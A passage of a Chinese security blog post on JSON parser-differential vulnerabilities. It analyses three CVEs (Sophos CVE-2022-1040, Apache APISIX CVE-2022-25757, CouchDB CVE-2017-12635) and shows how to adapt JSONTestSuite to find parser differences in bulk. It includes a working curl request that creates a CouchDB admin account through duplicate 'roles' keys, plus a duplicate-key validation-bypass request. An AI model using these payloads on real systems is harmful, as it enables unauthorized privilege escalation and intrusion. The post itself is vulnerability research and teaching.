&#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> <span class="type">SessionBean</span> <span class="variable">sessionBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SessionBean</span>();</span><br><span class="line">      sessionBean.setUserName(uname);</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>jetty侧的<code>org.json-20090211</code>这个库对于重复键会抛出异常</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JSONException &#123;</span><br><span class="line">	<span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(<span class="string">&quot;&#123; \&quot;name\&quot;: \&quot;test\&quot;, \&quot;name\&quot;: \&quot;test2\&quot;&#125;&quot;</span>);</span><br><span class="line">	System.out.println(json);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> org.json.JSONException: Duplicate key <span class="string">&quot;name&quot;</span></span><br><span class="line">	at org.json.JSONObject.putOnce(JSONObject.java:<span class="number">1094</span>)</span><br><span class="line">	at org.json.JSONObject.&lt;init&gt;(JSONObject.java:<span class="number">206</span>)</span><br><span class="line">	at org.json.JSONObject.&lt;init&gt;(JSONObject.java:<span class="number">420</span>)</span><br></pre></td></tr></table></figure>

<p>csc使用的<code>json-c</code>这个库来解析输入的数据，对于重复键，则取后面一个</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;json-c/json.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s;</span><br><span class="line">  json_object *json;</span><br><span class="line">  s = <span class="string">&quot;&#123; \&quot;key\&quot; : \&quot;val1\&quot;,\&quot;key\&quot;:\&quot;val2\&quot;&#125;&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;string = %s\n&quot;</span>, s);</span><br><span class="line">  json = json_tokener_parse(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;json = %s\n&quot;</span>, json_object_to_json_string_ext(json, JSON_C_TO_STRING_PRETTY));</span><br><span class="line">  json_object_put(json);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc test.c -o <span class="built_in">test</span> -ljson-c</span><br><span class="line">$ ./test </span><br><span class="line">string = &#123; <span class="string">&quot;key&quot;</span> : <span class="string">&quot;val1&quot;</span>,<span class="string">&quot;key&quot;</span>:<span class="string">&quot;val2&quot;</span>&#125;</span><br><span class="line">json = &#123;</span><br><span class="line">  <span class="string">&quot;key&quot;</span>:<span class="string">&quot;val2&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且当json的key中出现unicode空字符时，<code>json-c</code>对空字符会做截断，但<code>org.json-json</code>库会保留</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat test.c </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;json-c/json.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s;</span><br><span class="line">  json_object *json;</span><br><span class="line">  s = <span class="string">&quot;&#123; \&quot;key\&quot; : \&quot;val1\&quot;,\&quot;key\\u0000p0melo\&quot;:\&quot;val2\&quot;&#125;&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;string = %s\n&quot;</span>, s);</span><br><span class="line">  json = json_tokener_parse(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;json = %s\n&quot;</span>, json_object_to_json_string_ext(json, JSON_C_TO_STRING_PRETTY));</span><br><span class="line">  json_object_put(json);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc test.c -o <span class="built_in">test</span> -ljson-c</span><br><span class="line">$ ./test </span><br><span class="line">string = &#123; <span class="string">&quot;key&quot;</span> : <span class="string">&quot;val1&quot;</span>,<span class="string">&quot;key\u0000p0melo&quot;</span>:<span class="string">&quot;val2&quot;</span>&#125;</span><br><span class="line">json = &#123;</span><br><span class="line">  <span class="string">&quot;key&quot;</span>:<span class="string">&quot;val2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">// 被截断后识别为2个key的重复键，取后面一个，就是val2</span><br></pre></td></tr></table></figure>

<p>这个漏洞就是利用了这两个库的解析差异特性导致的绕过，我们使用下面命令开启debug，查看poc请求时的参数变化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">csc custom debug</span><br><span class="line">tail -f /<span class="built_in">log</span>/csc.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p>发送请poc请求，从日志可以看到，经过jetty侧<code>org.json-json</code>库解析转发到csc时，同时包含了<code>mode</code>和<code>mode\u0000p0melo</code>两个键</p>
<img src="/2024/05/07/JSON%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%A7%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Untitled%201-1715053743879-2.png" class="" title="Untitled">

<p>但是通过csc的<code>createJson</code>和<code>validateJson</code>方法解析后，只有原本的json数据只有一个<code>mode</code>键了，并且值为后一个键<code>716</code>，导致csc认为是请求的<code>716</code>模块，并且请求参数合法，导致返回了200状态码和其他符合jetty侧登录判断的数据，这就导致了登录绕过</p>
<img src="/2024/05/07/JSON%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%A7%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Untitled%202-1715053743879-4.png" class="" title="Untitled">

<h2 id="案例2：Apache-APISIX-CVE-2022-25757"><a href="#案例2：Apache-APISIX-CVE-2022-25757" class="headerlink" title="案例2：Apache APISIX CVE-2022-25757"></a>案例2：<strong>Apache APISIX</strong> CVE-2022-25757</h2><p>Apache Apisix使用了request-validation插件，它可以用来检查HTTP请求头和BODY内容，<code>request-validation.lua</code>中使用<code>cjson.safe</code>库解析字符串为json对象</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;</span><br><span class="line">    version = <span class="number">0.1</span>,</span><br><span class="line">    decode = <span class="built_in">require</span>(<span class="string">&quot;cjson.safe&quot;</span>).decode,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于重复键，<code>cjson.safe</code>优先取后面的键值去验证，而上游应用程序的 JSON 库选择第一个出现的值，例如 <code>jsoniter</code> 或 <code>gojay 3</code>，所以发送类似下面的json数据就能绕过数据校验，将非法数据请求到上游服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST http://127.0.0.1:9080/10</span><br><span class="line">...</span><br><span class="line">&#123;<span class="string">&quot;string_payload&quot;</span>:<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;string_payload&quot;</span>:<span class="string">&quot;good&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个典型的由于重复键优先级不一致导致的问题。</p>
<h2 id="案例3-CouchDB-权限提升-CVE-2017-12635"><a href="#案例3-CouchDB-权限提升-CVE-2017-12635" class="headerlink" title="案例3: CouchDB 权限提升 CVE-2017-12635"></a>案例3: <strong>CouchDB 权限提升</strong> CVE-2017-12635</h2><p>CouchDB是一个NoSQL数据库，有点像 JSON blob的大型键值存储，具有数据验证、查询和用户身份验证功能。CouchDB通过<code>/_users</code>接口来管理用户账户，通过 <code>PUT</code>请求到 <code>/_users/org.couchdb.user:your_username</code>来创建或修改账户，服务器会使用 Javascript的<code>validate_doc_update</code> 函数检查，确保用户不会尝试让自己成为管理员。</p>
<p>漏洞就出在Javascript JSON 解析器（在验证脚本中使用）与 CouchDB 内部使用的名为 jiffy 的解析器（Erlang语言）之间存在差异。看下这两个解析器对相同键的处理</p>
<p>Erlang</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; jiffy:decode(<span class="string">&quot;&#123;\&quot;foo\&quot;:\&quot;bar\&quot;, \&quot;foo\&quot;:\&quot;baz\&quot;&#125;&quot;</span>). </span><br><span class="line">&#123;[&#123;&lt;&lt;<span class="string">&quot;foo&quot;</span>&gt;&gt;,&lt;&lt;<span class="string">&quot;bar&quot;</span>&gt;&gt;&#125;,&#123;&lt;&lt;<span class="string">&quot;foo&quot;</span>&gt;&gt;,&lt;&lt;<span class="string">&quot;baz&quot;</span>&gt;&gt;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>Javascript</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; JSON.parse(<span class="string">&quot;&#123;\&quot;foo\&quot;:\&quot;bar\&quot;, \&quot;foo\&quot;: \&quot;baz\&quot;&#125;&quot;</span>)</span><br><span class="line">&#123;foo: <span class="string">&quot;baz&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>jiffy保留了2个重复键，用于验证的javascript取后面一个键值，并且CouchDB 数据内部表示的 getter 函数只会返回第一个值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">% Within couch_util:get_value </span><br><span class="line">lists:keysearch(Key, 1, List).</span><br></pre></td></tr></table></figure>

<p>所以我们可以通过下面的请求，让javascript解析是空，认为是非管理员用户，通过验证，而jiffy则新增的是管理员用户，从而越权新增一个admin权限用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT <span class="string">&#x27;http://localhost:5984/_users/org.couchdb.user:oops&#x27;</span></span><br><span class="line">--data-binary <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;oops&quot;,</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="string">  &quot;password&quot;: &quot;password&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="3-如何批量检测json解析器的差异性？"><a href="#3-如何批量检测json解析器的差异性？" class="headerlink" title="3.如何批量检测json解析器的差异性？"></a>3.如何批量检测json解析器的差异性？</h1><p>当我们漏洞挖掘的项目有多个json解析器的情况下，可以对<a class="link"   href="https://github.com/nst/JSONTestSuite/tree/master" >https://github.com/nst/JSONTestSuite/tree/master<i class="fas fa-external-link-alt"></i></a>这个工具稍作修改，就可以快速验证两个或多个解析器存在的差异。</p>
<h2 id="3-1工具简介"><a href="#3-1工具简介" class="headerlink" title="3.1工具简介"></a>3.1工具简介</h2><p>如下图，<code>run_test.py</code>是主要的代码逻辑入口，<code>parsers</code>目录下是各种解析器，<code>tests</code>目录下是针对<code>RFC 8259</code>做了各种变形的json，<code>test_transform</code>目录是各种解析器识别容易有差异性json数据（超大数字、重复键、空字符等）。</p>
<img src="/2024/05/07/JSON%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%A7%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Untitled%203-1715053743879-3.png" class="" title="Untitled">

<p><code>run_test.py</code>会对<code>parsers</code>目录下各种解析器做一个包装，将解析器执行的命令返回状态结果记录到<code>log.txt</code>，然后做解析美化记录到<code>results</code>目录下，下面是生成的<code>parsing.html</code>中的对比图表，包含各种解析器对不同json数据解析后返回的状态</p>
<img src="/2024/05/07/JSON%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%A7%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Untitled%204-1715053743879-5.png" class="" title="Untitled">

<p>工具是针对<code>RFC 8259</code>标准对各json析器做的测试用例，对比的是命令执行返回状态的差异，也就是判断解析是否符合预期的成功、异常或失败。下面是<code>run_test.py</code>执行结果的判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> result == <span class="string">&quot;CRASH&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tCRASH\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;y_&quot;</span>) <span class="keyword">and</span> result != <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tSHOULD_HAVE_PASSED\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;n_&quot;</span>) <span class="keyword">and</span> result == <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tSHOULD_HAVE_FAILED\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;i_&quot;</span>) <span class="keyword">and</span> result == <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tIMPLEMENTATION_PASS\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;i_&quot;</span>) <span class="keyword">and</span> result != <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tIMPLEMENTATION_FAIL\t%s&quot;</span> % (prog_name, filename)</span><br></pre></td></tr></table></figure>

<p>如果以<code>y_</code>开头的json用例都解析成功了，但是解析出来的内容不同，会被结果解析忽略，导致报告不会输出这种用例的结果。</p>
<p>所以对于解析器的差异性识别，除了解析结果的状态，我们也在意解析后的内容，所以对<code>run_test.py</code>调用解析器部分稍作修改，以便对比解析后的内容，下面是原来代码调用解析器部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_tests</span>(<span class="params">restrict_to_path=<span class="literal">None</span>, restrict_to_program=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        status = subprocess.call(</span><br><span class="line">            a,</span><br><span class="line">            stdin=my_stdin,</span><br><span class="line">            stdout=FNULL,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            timeout=<span class="number">5</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment">#print(&quot;--&gt;&quot;, status)</span></span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;timeout expired&quot;</span>)</span><br><span class="line">        s = <span class="string">&quot;%s\tTIMEOUT\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">        log_file.write(<span class="string">&quot;%s\n&quot;</span> % s)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;RESULT:&quot;</span>, result)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-- skip non-existing&quot;</span>, e.filename)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> e.errno == INVALID_BINARY_FORMAT <span class="keyword">or</span> e.errno == BAD_CPU_TYPE:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-- skip invalid-binary&quot;</span>, commands[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> use_stdin:</span><br><span class="line">        my_stdin.close()</span><br><span class="line"></span><br><span class="line">    result = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">        result = <span class="string">&quot;PASS&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> status == <span class="number">1</span>:</span><br><span class="line">        result == <span class="string">&quot;FAIL&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="string">&quot;CRASH&quot;</span></span><br><span class="line"></span><br><span class="line">    s = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="string">&quot;CRASH&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tCRASH\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;y_&quot;</span>) <span class="keyword">and</span> result != <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tSHOULD_HAVE_PASSED\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;n_&quot;</span>) <span class="keyword">and</span> result == <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tSHOULD_HAVE_FAILED\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;i_&quot;</span>) <span class="keyword">and</span> result == <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tIMPLEMENTATION_PASS\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;i_&quot;</span>) <span class="keyword">and</span> result != <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tIMPLEMENTATION_FAIL\t%s&quot;</span> % (prog_name, filename)</span><br></pre></td></tr></table></figure>

<p>不考虑将运行结果美化，将上面代码部分替换为如下简化代码，获取解析结果并直接输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_tests</span>(<span class="params">restrict_to_path=<span class="literal">None</span>, restrict_to_program=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> subprocess.Popen(</span><br><span class="line">                a,</span><br><span class="line">                stdin=my_stdin,</span><br><span class="line">                stdout=subprocess.PIPE,</span><br><span class="line">                stderr=subprocess.STDOUT,</span><br><span class="line">                text=<span class="literal">True</span></span><br><span class="line">        ) <span class="keyword">as</span> proc:</span><br><span class="line">            stdout, _ = proc.communicate(timeout=<span class="number">5</span>)</span><br><span class="line">            status = proc.returncode</span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        s = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 寻找以&quot;&#123;&quot;或&quot;[&quot;开头的行（获取解析后的结果）</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;^\s*[\&#123;\[].*&#x27;</span>, stdout, re.MULTILINE)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                matched_line = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">                s = <span class="string">&quot;%s\t解析成功\t%s\t解析结果：%s&quot;</span> % (prog_name, filename,matched_line)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="string">&quot;%s\t解析失败\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> use_stdin:</span><br><span class="line">            my_stdin.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;执行过程中遇到错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="comment"># 先注释掉生成报告部分</span></span><br><span class="line">    <span class="comment">#generate_report(os.path.join(BASE_DIR, &quot;results/parsing.html&quot;), keep_only_first_result_in_set = False)</span></span><br><span class="line">    <span class="comment">#generate_report(os.path.join(BASE_DIR, &quot;results/parsing_pruned.html&quot;), keep_only_first_result_in_set = True)   </span></span><br></pre></td></tr></table></figure>

<h2 id="3-2工具实践（CVE-2022-1040）"><a href="#3-2工具实践（CVE-2022-1040）" class="headerlink" title="3.2工具实践（CVE-2022-1040）"></a>3.2工具实践（CVE-2022-1040）</h2><p>现在我们通过前文的CVE-2022-1040为例，来看如何通过这个工具来批量比较<code>org.json-20090211</code>和<code>json-c</code>这两个json解析器的差异性。</p>
<p>在<code>parsers</code>目录中只有2016版本的<code>org.json</code>包，所以我们需要自己去下载<code>org.json-20090211</code>版本的<a class="link"   href="https://mvnrepository.com/artifact/org.json/json/20090211" >jar包<i class="fas fa-external-link-alt"></i></a>，并参考<a class="link"   href="https://github.com/nst/JSONTestSuite/blob/master/parsers/test_java_org_json_2016_08/TestJSONParsing.java" >TestJSONParsing.java<i class="fas fa-external-link-alt"></i></a>写一个主函数调用jar去解析，然后打一个jar包供<code>run_tests.py</code>调用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> <span class="string">&quot;.:json-20090211.jar&quot;</span> TestJSONParsing</span><br><span class="line">jar cvfm TestJSONParsing.jar META-INF/MANIFEST.MF json-20090211.jar TestJSONParsing.class</span><br></pre></td></tr></table></figure>

<p>将<code>TestJSONParsing.jar</code>放在<code>parsers</code>下的子目录下，子目录假设以<code>test_java_org_json_2009_02</code>，则对应在<code>run_tests.py</code>的<code>programs</code>数组中新增一个解析器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Java org.json 2009-02-11&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;url&quot;</span>:<span class="string">&quot;https://github.com/stleary/JSON-java&quot;</span>,</span><br><span class="line">            <span class="string">&quot;commands&quot;</span>:[<span class="string">&quot;/usr/bin/java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, os.path.join(PARSERS_DIR, <span class="string">&quot;test_java_org_json_2009_02/TestJSONParsing.jar&quot;</span>)]</span><br><span class="line">        &#125;,</span><br></pre></td></tr></table></figure>

<p><code>parsers</code>目录本身已有了<code>json-c</code>解析器，但是格式是Mach-O的，如果想要在正常的其他架构下运行需要自己<a class="link"   href="https://github.com/json-c/json-c" >下载对应的版本并编译<i class="fas fa-external-link-alt"></i></a>，将编译后的二进制文件移动到<code>parsers/test_json-c/bin</code>目录下并重命名为<code>test_json-c</code>（与<code>run_tests.py</code>的<code>programs</code>数组中的对应）</p>
<p>并通过<code>filter</code>参数限制我需要比较的2个解析器，效果如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> my_parses.json</span><br><span class="line">[<span class="string">&quot;Java org.json 2009-02-11&quot;</span>,<span class="string">&quot;C JSON-C&quot;</span>]</span><br><span class="line">$ <span class="built_in">cat</span> test_parsing/y_object_duplicated_key_and_value.json</span><br><span class="line">&#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;b&quot;</span>,<span class="string">&quot;a&quot;</span>:<span class="string">&quot;c&quot;</span>&#125;   <span class="comment">#原来数据2个val都是b，为了区分优先级，后一个改为c</span></span><br><span class="line">$ <span class="built_in">cat</span> test_parsing/y_object_escaped_null_in_key.json</span><br><span class="line">&#123;<span class="string">&quot;foo\u0000bar&quot;</span>: 42&#125;</span><br><span class="line">$ python run_test.py --filter=my_only.json </span><br><span class="line">//...</span><br><span class="line">C JSON-C        解析成功        y_object_duplicated_key_and_value.json  解析结果：&#123; <span class="string">&quot;a&quot;</span>: <span class="string">&quot;c&quot;</span> &#125;</span><br><span class="line">C JSON-C        解析成功        y_object_escaped_null_in_key.json       解析结果：&#123; <span class="string">&quot;foo&quot;</span>: 42 &#125;</span><br><span class="line">//...</span><br><span class="line">Java org.json 2009-02-11        解析失败        y_object_duplicated_key_and_value.json</span><br><span class="line">Java org.json 2009-02-11        解析成功        y_object_escaped_null_in_key.json       解析结果：&#123;<span class="string">&quot;foo\u0000bar&quot;</span>:42&#125;</span><br><span class="line">//...</span><br></pre></td></tr></table></figure>

<p>通过上面的重复键解析结果可以看到，<code>json-c</code>解析器能获取重复键的最后一个，而<code>org.json</code>则异常了，并且对于nul的key解析也有差异。</p>
<p>除了这2个差异之外，还可以看到很多其他的差异，例如带注释的json数据<code>&#123;&quot;a&quot;:&quot;b&quot;&#125;/**/</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C JSON-C        解析失败        n_object_trailing_comment.json</span><br><span class="line">Java org.json <span class="number">2009</span>-02-<span class="number">11</span>        解析成功        n_object_trailing_comment.json  解析结果：&#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;b&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>超大数字解析 <code>&#123;9999E9999:1&#125;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C JSON-C        解析失败        n_object_non_string_key_but_huge_number_instead.json</span><br><span class="line">Java org.json <span class="number">2016</span>-08-<span class="number">15</span>        解析成功        n_object_non_string_key_but_huge_number_instead.json    解析结果：&#123;<span class="string">&quot;9999E9999&quot;</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>

<p>这里只是简单的做一个解析后内容的输出，如果当json用例非常多时，有差异的结果就比较难找，读者可参考项目的结果美化逻辑，对结果做进一步的美化，方便对比。</p>
<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h1><p>本文介绍了导致json解析差异性的背景，结合3个经典由json解析差异性导致的cve进行分析，并通过修改已有工具和集成新的解析器实现批量的json差异性检测。</p>
<h1 id="5-参考"><a href="#5-参考" class="headerlink" title="5.参考"></a><strong>5.参考</strong></h1><p><a class="link"   href="https://seriot.ch/projects/parsing_json.html" >https://seriot.ch/projects/parsing_json.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://bishopfox.com/blog/json-interoperability-vulnerabilities" >https://bishopfox.com/blog/json-interoperability-vulnerabilities<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/nst/JSONTestSuite/tree/master" >https://github.com/nst/JSONTestSuite/tree/master<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.freebuf.com/articles/web/341863.html" >https://www.freebuf.com/articles/web/341863.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" >https://justi.cz/security/2017/11/14/couchdb-rce-npm.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
</search>
